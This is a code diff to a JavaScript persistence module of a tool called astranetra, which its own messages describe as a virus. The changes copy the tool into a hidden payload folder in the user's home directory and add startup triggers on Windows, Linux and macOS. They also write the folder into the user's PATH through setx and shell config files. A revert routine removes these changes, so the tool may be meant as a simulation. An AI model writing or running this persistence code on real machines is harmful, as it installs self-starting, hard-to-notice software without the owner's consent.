@@ -40,36 +40,58 @@ async function selfCopy() {
 
   fs.mkdirSync(targetDir, { recursive: true });
 
-  const srcScript = path.join(CWD, 'index.js');
+  // 1. Drop the payload folder in the user's home directory
+  const dropDir = path.join(home, '.astranetra_payload');
+  try {
+    fs.cpSync(CWD, dropDir, {
+      recursive: true,
+      force: true,
+      filter: (src) => {
+        const basename = path.basename(src);
+        return !['.git', 'logs', 'reports', 'db', 'snapshots', '.astranetra_trash', 'sandbox', 'temp'].includes(basename);
+      }
+    });
+    
+    // Create global command wrappers so it can be run from anywhere via PATH
+    const batWrapper = `@echo off\ncd /d "%~dp0"\nnode "index.js" %*\n`;
+    const shWrapper = `#!/bin/sh\ncd "$(dirname "$0")"\nnode "index.js" "$@"\n`;
+    
+    fs.writeFileSync(path.join(dropDir, 'astra.bat'), batWrapper, 'utf8');
+    fs.writeFileSync(path.join(dropDir, 'astra'), shWrapper, 'utf8');
+    try { fs.chmodSync(path.join(dropDir, 'astra'), 0o755); } catch(e) {}
+
+    console.log(`\x1b[32m[PERSIST]\x1b[0m Dropped hidden payload folder at: ${dropDir}`);
+  } catch (err) {
+    logger.warn('PersistenceEngine', 'PAYLOAD_DROP_FAILED', { error: err.message });
+  }
+
+  const droppedScript = path.join(dropDir, 'index.js');
   let copyResult  = null;
 
   if (platform === 'win32') {
-    const dest = path.join(targetDir, 'astranetra.js');
-    fs.copyFileSync(srcScript, dest);
+    const dest = path.join(targetDir, 'astranetra.bat');
+    fs.writeFileSync(dest, `@echo off\nnode "${droppedScript}"\n`, 'utf8');
     copyResult = dest;
     logger.info('PersistenceEngine', 'SELF_COPY_WIN32', { dest });
-    console.log(`\x1b[32m[PERSIST]\x1b[0m Copied to startup folder: ${dest}`);
+    console.log(`\x1b[32m[PERSIST]\x1b[0m Created startup trigger: ${dest}`);
 
   } else if (platform === 'linux') {
-    // Create a .desktop file for autostart
     const desktopPath = path.join(targetDir, 'astranetra.desktop');
     const desktop = [
       '[Desktop Entry]',
       'Type=Application',
       'Name=astranetra',
-      `Exec=node ${srcScript}`,
+      `Exec=node ${droppedScript}`,
       'Hidden=false',
       'NoDisplay=false',
       'X-GNOME-Autostart-enabled=true',
     ].join('\n');
-    fs.mkdirSync(targetDir, { recursive: true });
     fs.writeFileSync(desktopPath, desktop, 'utf8');
     copyResult = desktopPath;
     logger.info('PersistenceEngine', 'SELF_COPY_LINUX', { dest: desktopPath });
     console.log(`\x1b[32m[PERSIST]\x1b[0m Created autostart entry: ${desktopPath}`);
 
   } else if (platform === 'darwin') {
-    // Create a LaunchAgent .plist
     const plistPath = path.join(targetDir, 'com.astranetra.plist');
     const plist = `<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -79,25 +101,24 @@ async function selfCopy() {
   <key>ProgramArguments</key>
   <array>
     <string>${process.execPath}</string>
-    <string>${srcScript}</string>
+    <string>${droppedScript}</string>
   </array>
   <key>RunAtLoad</key>     <true/>
   <key>KeepAlive</key>     <false/>
 </dict>
 </plist>`;
-    fs.mkdirSync(targetDir, { recursive: true });
     fs.writeFileSync(plistPath, plist, 'utf8');
     copyResult = plistPath;
     logger.info('PersistenceEngine', 'SELF_COPY_DARWIN', { dest: plistPath });
     console.log(`\x1b[32m[PERSIST]\x1b[0m Created LaunchAgent: ${plistPath}`);
   }
 
-  return copyResult;
+  return { copyResult, dropDir };
 }
 
 // ── STEP 2: PATH REGISTRATION ────────────────────────────────────────────────
-async function registerInPath() {
-  const injectedDir = CWD;
+async function registerInPath(dropDir) {
+  const injectedDir = dropDir || CWD;
   const exportLine  = `\nexport PATH="$PATH:${injectedDir}"  # astranetra\n`;
 
   if (platform === 'win32') {
@@ -111,7 +132,8 @@ async function registerInPath() {
         } else {
           execSync(`setx PATH "${newPath}"`, { encoding: 'utf8' });
           logger.info('PersistenceEngine', 'PATH_REGISTERED_WIN32', { dir: injectedDir });
-          console.log(`\x1b[32m[PATH]\x1b[0m Registered in user PATH via setx: ${injectedDir}`);
+          console.log(`\x1b[32m[PATH]\x1b[0m Registered hidden payload in user PATH via setx: ${injectedDir}`);
+          console.log(`\x1b[36m[PATH] You can now type 'astra' from ANY terminal to run the virus!\x1b[0m`);
         }
       } else {
         console.log(`\x1b[36m[PATH]\x1b[0m Already in PATH.`);
@@ -141,6 +163,7 @@ async function registerInPath() {
       written.push(shellConfig);
       logger.info('PersistenceEngine', 'PATH_REGISTERED_UNIX', { file: shellConfig, dir: injectedDir });
       console.log(`\x1b[32m[PATH]\x1b[0m Appended to ${shellConfig}`);
+      console.log(`\x1b[36m[PATH] Open a new terminal and type 'astra' to run it from anywhere!\x1b[0m`);
     } catch (e) {
       logger.warn('PersistenceEngine', 'SHELL_CONFIG_WRITE_FAILED', { file: shellConfig, error: e.message });
     }
@@ -156,18 +179,23 @@ export async function persist() {
 
   const state = loadState();
 
-  const copyTarget = await selfCopy();
-  const pathResult = await registerInPath();
+  const selfCopyRes = await selfCopy();
+  const copyTarget = selfCopyRes?.copyResult;
+  const dropDir = selfCopyRes?.dropDir;
+  
+  const pathResult = await registerInPath(dropDir);
 
   const entry = {
     ts:          new Date().toISOString(),
     platform,
     copyTarget,
+    dropDir,
     pathResult,
     revertCmd:   'node index.js persist --revert',
   };
 
-  state.copies.push(copyTarget);
+  if (copyTarget) state.copies.push(copyTarget);
+  if (dropDir) state.copies.push(dropDir);
   if (pathResult?.configs) state.shellLines.push(...pathResult.configs);
   saveState(state);
 
@@ -183,12 +211,17 @@ export async function revert() {
   const state = loadState();
   let reverted = 0;
 
-  // Remove copied files
+  // Remove copied files and payload folder
   for (const copyPath of state.copies) {
     if (!copyPath) continue;
     try {
       if (fs.existsSync(copyPath)) {
-        fs.unlinkSync(copyPath);
+        const stats = fs.statSync(copyPath);
+        if (stats.isDirectory()) {
+          fs.rmSync(copyPath, { recursive: true, force: true });
+        } else {
+          fs.unlinkSync(copyPath);
+        }
         console.log(`\x1b[32m✓ Removed:\x1b[0m ${copyPath}`);
         logger.info('PersistenceEngine', 'REVERT_COPY_REMOVED', { path: copyPath });
         reverted++;
